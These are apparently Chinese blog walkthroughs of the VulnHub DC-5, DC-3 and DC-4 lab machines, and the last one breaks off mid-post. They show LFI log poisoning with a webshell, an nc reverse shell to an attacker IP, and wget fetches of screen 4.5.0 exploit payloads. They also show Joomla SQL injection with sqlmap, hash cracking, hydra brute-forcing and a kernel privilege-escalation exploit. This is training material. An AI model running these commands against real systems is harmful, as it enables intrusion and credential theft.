        <content type="html"><![CDATA[<p>vulnhub第六个靶机</p><p>靶机地址： <a href="https://www.vulnhub.com/entry/dc-5,314/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-5,314/</a>.</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap查询局域网内存活的主机，发现靶机ip</p><pre><code>nmap -T4 192.168.40.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613213052765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>用nmap进行更详细的探测，发现开着的端口和服务<a id="more"></a>)</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>http</td></tr><tr><td>111</td><td>rpcbind</td></tr><tr><td>49800</td><td>rpcbind</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613213830963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="LFI包含日志文件写马"><a href="#LFI包含日志文件写马" class="headerlink" title="LFI包含日志文件写马"></a>LFI包含日志文件写马</h1><p>端口：80——&gt;web漏洞——&gt;成功</p><p>访问主页发现都是一些文章，只找到一个可以写东西的页面，应该是突破口</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613214040750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>提交数据以后进入到另一个页面，并且每刷新一次页面中下的年份就变化一次，猜测可能存在LFI漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613214227585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>通过fuzz测试，发现包含语句为file=</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613214528163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>从前面nmap的扫描得此站点的服务器为nginx，可以在url上写一句话木马，写到访问日志。再包含nginx访问日志，从而拿shell</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613215257355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>这里要注意别直接在浏览器url上写马，木马会被进行url加密，从而使蚁剑连不上木马。可以用burp抓包再修改，再包含日志文件，用蚁剑连接<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613221605537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613221940598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="screen-4-5-0提权"><a href="#screen-4-5-0提权" class="headerlink" title="screen 4.5.0提权"></a>screen 4.5.0提权</h1><p>用蚁剑进行nc反弹shell</p><pre><code>nc -e /bin/sh 192.168.40.129 4444</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613222337987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>python -c "import pty;pty.spawn('/bin/bash')"  #打开一个标准shellcat /etc/passwd</code></pre><p>发现一个用户：dc</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613222646772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>粗略的查看了没有sudo命令，邮件、备份文件、定时任务也没有，22端口是关闭的不能爆破。<br>最后在suid中找到了一个存在漏洞的工具<a href="https://blog.csdn.net/u010239768/article/details/80724727" target="_blank" rel="noopener">screen</a></p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613223445764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613223734218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在kali中寻找该漏洞的poc</p><pre><code> searchsploit screen 4.5.0</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613224022248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>将poc复制到桌面，开启http服务</p><pre><code>cp  /usr/share/exploitdb/exploits/linux/local/41154.sh /root/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613224339146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613230041180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>按提示生成.c文件并编译</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613225740683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613225850896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>在kali上开启http服务</p><pre><code>python -m SimpleHTTPServer</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020061323045940.png" alt=""><br>靶机上下载</p><pre><code>wget http://192.168.40.129:8000/libhax.sowget http://192.168.40.129:8000/rootshell</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613230439106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>执行脚本后面的命令</p><pre><code>cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so... </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613231206754.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613231118544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>再回到/tmp上执行脚本，拿到root权限</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020061323150333.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613231520261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="thisistheflag.txtthisistheflag.txtthisistheflag.txtthisistheflag.txt"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnub-dc-3</title>
      <link href="/posts/89a2a2e8.html"/>
      <url>/posts/89a2a2e8.html</url>
      
        <content type="html"><![CDATA[<p>vulnhub第四个靶机</p><p>靶机地址: <a href="https://www.vulnhub.com/entry/dc-32,312/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-32,312/</a>.</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap查询局域网内存活的主机，发现靶机ip</p><pre><code>nmap 192.168.88.0/24 -T4</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602200454353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>用nmap进行更详细的探测，发现开着的端口和服务<a id="more"></a>)</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>http</td></tr></tbody></table><pre><code>nmap 192.168.88.139 -T4 -A -sV -p-</code></pre><p>nmap扫出了是<a href="https://www.oschina.net/p/joomla?hmsr=aladdin1e1" target="_blank" rel="noopener">joomlaCMS</a>，在github上有专门的扫描工具 <a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">joomscan</a>.</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602200940347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="joomlaCMS的sql注入"><a href="#joomlaCMS的sql注入" class="headerlink" title="joomlaCMS的sql注入"></a>joomlaCMS的sql注入</h1><p>端口：80——&gt;web漏洞——&gt;成功</p><p>用joomscan对其进行扫描，发现网站管理后台和joomla版本</p><pre><code>./joomscan.pl --url 192.168.88.139 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202006022020442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在kali中寻找该版本漏洞信息，发现两条关于注入的利用方法，我这里使用的是42033.txt里面的方法</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602203258253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>注入成功</p><pre><code>sqlmap -u "http://192.168.88.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --dbs</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602210000886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>成功爆出用户名和hash密码，再配合john爆破hash，成功获取明文密码。</p><pre><code>sqlmap -u "http://192.168.88.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" -D 'joomladb' -T '#__users' -C 'name','password'  --dump</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602210351871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>john --wordlist=rockyou.txt dc3.txt</code></pre><p>admin:snoopy</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602210655377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>如下图所示编写nc的php反弹shell，在kali设置监听，然后访问木马，即可收到反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602212448415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>需要注意的是这个一句话的路径是：<a href="http://192.168.88.139/templates/beez3/index.php" target="_blank" rel="noopener">http://192.168.88.139/templates/beez3/index.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602222233523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602222442333.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602222502432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060222253596.png" alt=""></p><h1 id="内核提权ubuntu-16-04"><a href="#内核提权ubuntu-16-04" class="headerlink" title="内核提权ubuntu 16.04"></a>内核提权ubuntu 16.04</h1><pre><code>python -c "import pty;pty.spawn('/bin/bash')"</code></pre><p>接下来就是提权部分，但是查看了一下，没有可执行sudo命令的用户，没有suid权限的可执行命令或者文件，没有定时任务，没有权限滥用危险文件。万不得已只能试一下内核提权了。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602224921488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>searchsploit ubuntu 16.04 cat /usr/share/exploitdb/exploits/linux/local/39772.txtwget unzip 39772.zip  #解压29772.zip文件cd 39772tar -xvf exploit.tar  #解压exploit提权脚本tar包cd ebpf_mapfd_doubleput_exploit./compile.sh ./doubleputid</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602232649292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>参考链接: <a href="https://blog.csdn.net/weixin_44426869/article/details/104779201?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44426869/article/details/104779201?fps=1&amp;locationNum=2</a>.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnub-dc-4</title>
      <link href="/posts/99a2a2e8.html"/>
      <url>/posts/99a2a2e8.html</url>
      
        <content type="html"><![CDATA[<p>vulnhub第五个靶机</p><p>靶机地址： <a href="https://www.vulnhub.com/entry/dc-4,313/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-4,313/</a>.</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap查询局域网内存活的主机，发现靶机ip</p><pre><code>nmap -T4 192.168.40.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020061317145053.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>用nmap进行更详细的探测，发现开着的端口和服务<a id="more"></a>)</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>22</td><td>ssh</td></tr><tr><td>80</td><td>http</td></tr></tbody></table><pre><code>nmap -T4 -sV -A -p- 192.168.40.134</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613171754953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>端口：22——&gt;爆破——&gt;失败</p><pre><code>hydra -l root -P rockyou.txt 192.168.40.134 ssh -t 4</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613172459800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h1><p>端口：80——&gt;web漏洞——&gt;成功</p><p>访问主页发现是一个登录框，对后台进行扫描，没发现可利用的信息，只能对其进行爆破。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613180110894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>使用hydra对其登录页面进行爆破，爆破出帐号密码<br>admin:happy</p><pre><code>hydra -l admin -P rockyou.txt 192.168.40.134 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613180059592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>登录到后台发现有一个可以之执行命令的页面<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613180836205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>可以对其抓包反弹shell，拿shell（一句话木马和bash貌似被过滤了，所以利用nc）</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613182241748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>python -c "import pty;pty.spawn('/bin/bash')"  #打开一个标准shellcat /etc/passwd</code></pre><p>发现有三个用户，分别是：charles、jim、sam<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613183034527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>经过一番好找，最后在home/jim/backups目录下找到一个密码字典</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613202832512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在靶机上开启临时http服务，在kali上下载该密码文件</p><pre><code>python -m SimpleHTTPServerwget http://192.168.40.134:8000/old-passwords.bak</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613203331946.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613203445327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>用hydra对jim用户进行爆破</p><pre><code>hydra -l jim -P old-passwords.bak 192.168.40.134 ssh -t 20</code></pre><p>帐号密码：jimi：jibril04<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613204813453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="teehee的sudo提权"><a href="#teehee的sudo提权" class="headerlink" title="teehee的sudo提权"></a>teehee的sudo提权</h1><p>在jim目录下发现一封邮件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613210041141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在/var/mail下查看邮件，发现charles的密码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200613210117778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>登录之后，发现charles可以无密码以root身份执行teehee命令，该命令可以追加数据</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 